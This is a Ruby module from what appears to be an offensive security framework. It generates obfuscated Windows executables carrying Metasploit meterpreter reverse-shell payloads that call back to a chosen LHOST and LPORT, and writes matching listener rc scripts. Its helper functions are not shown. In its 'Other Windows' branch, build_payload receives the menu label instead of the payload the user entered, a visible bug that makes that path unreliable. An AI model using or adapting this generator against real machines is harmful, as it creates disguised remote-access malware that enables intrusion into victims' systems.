require 'lib_meta'

class Payloadgen < Poet
	include Lib_meta
	self.mod_name = "Create an executable and rc script"
	self.description = "Create and obsfucate payloads for further use."
  self.title = 'Payload generation'

	def initialize
		# Redo instance variables since not inherieting from poet
		t = Time.now
		logger = Logger.new("#{Menu.opts[:log]}/debug/#{self.class}_#{t.strftime('%m-%d-%Y_%H-%M')}")
		logger.datetime_format = "%Y-%m-%d %H:%M:%S"
		logger.info("#{self.class} started")
		@log = Menu.opts[:log]

		puts 

		payloads = {
			1 => 'windows/meterpreter/reverse_http',
			2 => 'windows/meterpreter/reverse_https',
			3 => 'windows/meterpreter/reverse_tcp',
			4 => 'windows/meterpreter/reverse_tcp_dns',
			5 => 'Other Windows Payload',
		}

		payloads.each { |x,y|
			puts "    #{x}) #{y}"
		}
		puts

		lhost, lport = '',''

		# Selection for payload
		selection = ''
		until (1..payloads.length).member?(selection.to_i)
			print "Select payload [#{color_banner('1')}] : "
			selection = rgets
			selection = 1 if selection.empty?
		end
		payload = payloads[selection.to_i]
		puts

		# Determine what to do depending on selection
		if payload =~ /^windows\//
			if payload.eql? 'windows/meterpreter/reverse_tcp_dns'
				lhost, lport = get_meter_data(true)
			else
				lhost, lport = get_meter_data
			end
			final_payload, payload_hash = build_payload(payload, lhost, lport)
			logger.info("Payload hash: #{payload_hash}")
			rc = create_rc(payload, lhost, lport)
			
		elsif payload =~ /^Other Windows/
			# Get the name of the other payload to use
			win_payload = ''
			while win_payload.empty?
				print("Enter a windows payload to use: ")
				win_payload = rgets.downcase
			end
			lhost, lport = get_meter_data
			final_payload, payload_hash = build_payload(payload, lhost, lport)
			logger.info("Payload hash: #{payload_hash}")
			rc = create_rc(win_payload, lhost, lport)
		end
		logger.info("#{self.class} finished")
		logger.close

		puts
		print "Press enter to Return to Exploitation Menu"
		gets
	end
end
